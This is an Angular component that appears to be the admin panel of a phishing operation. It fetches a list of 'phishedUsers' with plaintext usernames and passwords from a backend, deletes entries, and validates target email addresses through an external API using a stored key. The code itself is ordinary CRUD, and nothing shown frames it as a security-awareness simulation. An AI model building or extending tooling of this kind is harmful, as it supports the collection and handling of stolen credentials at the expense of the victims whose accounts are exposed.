import {Component, OnInit} from '@angular/core';
import {JsonPipe, NgIf} from "@angular/common";
import {environment} from "../../../environments/environment";
import {HttpClient, HttpClientModule} from "@angular/common/http";
import {ActivatedRoute, RouterLink} from "@angular/router";
import {FormControl, ReactiveFormsModule, Validators} from "@angular/forms";

@Component({
  selector: 'app-control-email',
  standalone: true,
  imports: [
    JsonPipe,
    HttpClientModule,
    ReactiveFormsModule,
    NgIf,
    RouterLink
  ],
  templateUrl: './control-email.component.html',
  styleUrl: './control-email.component.css'
})
export class ControlEmailComponent implements OnInit {
  phishedUsers: {username: string, password: string}[] = []
  userId?: string
  checkedEmail = new FormControl(null, [Validators.required, Validators.email])
  emailInformation: any

  constructor(private http: HttpClient, private route: ActivatedRoute) {
  }

  async ngOnInit() {
    this.route.queryParams.subscribe(params => {
      this.userId = params['id']
    })
    await this.getPhishedUsers()
  }

  async getPhishedUsers() {
    return this.http.get(`${environment.apiUrl}/users.json`).toPromise().then((data: any)=> {
      this.phishedUsers = data
    })
  }

  controlEmail() {
    const options = {method: 'GET'}
    const {MAIL_CHECKER_API_KEY} = environment
    fetch(`https://emailvalidation.abstractapi.com/v1?email=${this.checkedEmail.value}&api_key=${MAIL_CHECKER_API_KEY}&auto_correct=true`, options)
      .then(response => response.json())
      .then(response => this.emailInformation=response)
      .catch(err => this.emailInformation=err)
  }

  async deleteUser() {
    return this.http.delete(`${environment.apiUrl}/users/${this.userId}.json`).toPromise().then(()=> {
      this.getPhishedUsers()
    })
  }
}
